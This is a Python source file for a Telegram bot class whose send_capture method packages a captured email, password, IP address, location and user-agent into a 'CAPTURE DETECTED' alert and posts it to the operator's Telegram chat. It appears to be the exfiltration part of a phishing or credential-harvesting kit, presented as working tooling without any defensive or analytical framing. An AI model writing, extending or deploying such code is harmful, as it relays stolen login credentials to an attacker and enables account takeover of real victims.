import requests
from datetime import datetime

class TelegramBot:
    def __init__(self, token=None, chat_id=None):
        self.token = token
        self.chat_id = chat_id
        self.status = 'not_configured'
        self.last_error = None
    
    def configure(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.status = 'testing'
        return self.test()
    
    def test(self):
        if not self.token or not self.chat_id:
            self.status = 'not_configured'
            return False
        try:
            url = f'https://api.telegram.org/bot{self.token}/getMe'
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    self.status = 'connected'
                    self.send_message('🤖 *Bot is connected and ready!*')
                    return True
                else:
                    self.status = 'invalid_token'
                    self.last_error = result.get('description', 'Unknown error')
                    return False
            else:
                self.status = 'invalid_token'
                self.last_error = f'HTTP {response.status_code}'
                return False
        except Exception as e:
            self.status = 'error'
            self.last_error = str(e)
            return False
    
    def send_message(self, message, parse_mode='Markdown'):
        if not self.token or not self.chat_id:
            self.status = 'not_configured'
            return False
        
        chat_id_clean = self.chat_id.strip()
        
        try:
            url = f'https://api.telegram.org/bot{self.token}/sendMessage'
            payload = {
                'chat_id': chat_id_clean,
                'text': message,
                'parse_mode': parse_mode,
                'disable_web_page_preview': True
            }
            response = requests.post(url, json=payload, timeout=15)
            result = response.json()
            
            if result.get('ok'):
                self.status = 'connected'
                return True
            else:
                self.last_error = result.get('description', 'Unknown error')
                return False
        except Exception as e:
            self.last_error = str(e)
            return False
    
    def send_capture(self, data):
        if not self.token or not self.chat_id:
            return False
        
        msg = f"""🚨 **CAPTURE DETECTED** 🚨

📋 **Type:** {data.get('type', 'Unknown')}
📧 **Email:** `{data.get('email', 'N/A')}`
🔑 **Password:** `{data.get('password', 'N/A')}`
🌐 **IP:** `{data.get('ip', 'N/A')}`
📍 **Location:** {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}
🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔍 **User-Agent:** `{data.get('user_agent', 'N/A')[:60]}`"""
        
        return self.send_message(msg)